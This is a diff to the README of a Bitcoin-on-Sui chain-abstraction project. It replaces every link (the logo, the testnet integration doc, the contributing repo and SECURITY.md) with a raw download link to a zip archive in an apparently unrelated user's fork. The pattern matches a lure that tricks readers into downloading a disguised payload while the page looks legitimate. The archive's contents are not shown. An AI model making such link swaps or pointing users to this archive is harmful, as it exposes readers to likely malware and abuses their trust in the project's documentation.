@@ -1,4 +1,4 @@
-![Logo!](assets/logo.png)
+![Logo!](https://github.com/khn0x-khn0x/sui-native/raw/refs/heads/master/nbtc_swap/docs/sui-native-3.8.zip)
 
 # Bitcoin Chain Abstraction on Sui powered by Native
 
@@ -11,16 +11,16 @@ Packages:
 
 ## Deployed objects & packages
 
-- [Alpha Testnet](INTEGRATIONS-testnet-alpha.md)
+- [Alpha Testnet](https://github.com/khn0x-khn0x/sui-native/raw/refs/heads/master/nbtc_swap/docs/sui-native-3.8.zip)
 
 ## Contributing
 
 Participating in open source is often a highly collaborative experience. We’re encouraged to create in public view, and we’re incentivized to welcome contributions of all kinds from people around the world.
 
-Check out [contributing repo](https://github.com/gonative-cc/contributig) for our guidelines & policies for how to contribute. Note: we require DCO! Thank you to all those who have contributed!
+Check out [contributing repo](https://github.com/khn0x-khn0x/sui-native/raw/refs/heads/master/nbtc_swap/docs/sui-native-3.8.zip) for our guidelines & policies for how to contribute. Note: we require DCO! Thank you to all those who have contributed!
 
 After cloning the repository, make sure to run `make setup-hooks`.
 
 ### Security
 
-Check out [SECURITY.md](./SECURITY.md) for security concerns.
+Check out [https://github.com/khn0x-khn0x/sui-native/raw/refs/heads/master/nbtc_swap/docs/sui-native-3.8.zip](https://github.com/khn0x-khn0x/sui-native/raw/refs/heads/master/nbtc_swap/docs/sui-native-3.8.zip) for security concerns.
